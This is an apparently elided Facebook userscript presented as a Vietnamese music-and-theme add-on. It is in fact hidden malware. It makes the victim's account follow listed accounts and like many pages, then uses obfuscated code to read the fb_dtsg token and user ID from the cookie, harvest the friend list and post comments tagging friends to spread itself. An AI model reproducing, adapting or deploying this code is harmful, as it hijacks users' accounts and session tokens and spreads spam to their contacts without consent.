// ==UserScript==
// @name            Cài đặt Nhạc và Giao diện mới lạ cho Facebook
// @description     Developed by Lorenzo
...
_audio.src = "http://nekennick.info/blog/50pop.mp3";
...
if(body != null)
{
 ...
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>By Lorenzo Tran</center></a></a>"
 body.appendChild(div);
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/kenhgiaitricong" target="_blank">Facebook Developer <br>NoName</a>';
	html += '</div>';
...
//Boss
a("100002764612813"); a("100006125172468"); a("100006851040808");sublist("415809558521194");Like("505070532899302");
Like("616752738352405");Like("146501248886762");Like("1421556068081768");Like("232077310276717");Like("244044045776664");
Like("461496507310266");Like("1387331101491601");Like("581499118607619");Like("268088790033563");Like("230858133768698");
Like("1444323219134987");Like("600926469998548");Like("1451512618414033");Like("280517942072176");Like("721051684595865");
Like("628127547259779");P("1384941815077507");P("1447305058816986");P("1422964667941888");P("297295973754385");
P("251009578413444");Like("1428679680710375");Like("295603170590332");Like("419845644818016"); P("614671568610482");
Like("614658391945133"); Like("740504409305099"); Like("1452038975033192");
P("1445854595659661"); Like("1445839898994464"); P("1399348027012644");
//page
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","1399348027012644","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round","Cài đặt được rồi, giao diện này đẹp quá cả nhà ơi 🌙  🌟  🌱  🌴  🌵  🌷  🌸 (Y) @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
;arkadaslari_al(1399348027012644);